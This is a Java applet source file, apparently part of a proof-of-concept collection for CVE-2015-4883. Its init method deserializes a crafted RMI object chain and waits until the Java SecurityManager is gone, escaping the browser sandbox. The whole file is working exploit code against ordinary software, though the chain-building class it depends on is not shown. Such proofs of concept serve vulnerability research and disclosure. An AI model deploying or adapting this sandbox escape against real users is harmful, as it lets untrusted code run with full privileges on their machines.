package poc.cve_2015_4883;

import java.applet.Applet;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

import poc.shared.Utils;

public class Main extends Applet {
	
	private static final long serialVersionUID = 1566735668863834029L;
	
	
	private static void disableSecurity() {
		try {
			Utils.enter( "Disable SecurityManager" );
			
			Utils.log( "Creating RMI Object Chain." );
			byte[] rmiChain = RMIChain.createChain();
			
			ObjectInputStream objectIn = new ObjectInputStream( new ByteArrayInputStream( rmiChain ) );
			
			Utils.log( "Reading in RMI Object Chain. This may take a while." );
			objectIn.readObject();
			Utils.log( "Finished reading in RMI Object Chain." );
			
			Utils.log( "Waiting for secondary read." );
			while( System.getSecurityManager() != null );
			Utils.log( "Secondary read complete." );
			
			Utils.log( "SecurityManager removed." );
		}
		catch ( Throwable t ) {
			Utils.log( "Failed to remove SecurityManager." );
			t.printStackTrace();
		}
		finally {
			Utils.exit();
		}
	}
	
	@Override
	public void init() {
		System.err.println( "SecurityManager: " + System.getSecurityManager() );
		Main.disableSecurity();
		System.err.println( "SecurityManager: " + System.getSecurityManager() );
	}
	
}
